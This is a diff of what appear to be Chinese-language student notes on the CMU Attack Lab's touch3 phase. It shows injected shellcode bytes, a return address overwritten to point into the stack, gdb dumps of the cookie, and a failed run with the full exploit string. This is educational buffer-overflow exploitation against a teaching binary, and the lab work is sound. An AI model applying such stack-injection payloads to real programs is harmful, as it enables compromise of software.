@@ -408,7 +408,7 @@ void touch3(char* sval)
 
 
 ```asm
-# 48 c7 c7 e4 44 60 00:mov $0 %rdi
+# 48 c7 c7 e4 44 60 00:mov $0x5561dc1b %rdi
 0x5561dc78:     0x48    0xc7    0xc7    0x1b    0xdc    0x61    0x55    0x48 
 # 48 c7 44 24 00 ec 17 40 00: mov 0x4018fa (%rsp)
 0x5561dc80:     0xc7    0x44    0x24    0x00    0xfa    0x18    0x40    0x00
@@ -421,6 +421,35 @@ void touch3(char* sval)
 # 调用Gets()的返回地址，即/x *(int*)$rsp = 0x4017b4，将其改为注入代码的地址
 # 0x5561dc78，即栈顶位置
 0x5561dca0:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+```
+
+
+
+```asm
+(gdb) x/20cb 0x6044e4
+0x6044e4 <cookie>:      -6 '\372'       -105 '\227'     -71 '\271'      89 'Y'  0 '\000'        0 '
+        0 '\000'        0 '\000'
+0x6044ec:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '
+        0 '\000'        0 '\000'
+0x6044f4:       0 '\000'        0 '\000'        0 '\000'        0 '\000'
+(gdb) x/20xb 0x6044e4
+0x6044e4 <cookie>:      0xfa    0x97    0xb9    0x59    0x00    0x00    0x00    0x00
+0x6044ec:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x6044f4:       0x00    0x00    0x00    0x00
+```
+
+
+
+
+
+```asm
+Type string:Misfire: You called touch3("���Y")
+# "\372\227\271Y"
+FAIL: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:FAIL:0xffffffff:ctarget:3:48 C7 C7 E4 44 60 00 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 78 DC 61 55 00 00 00 00
 ```
 
 
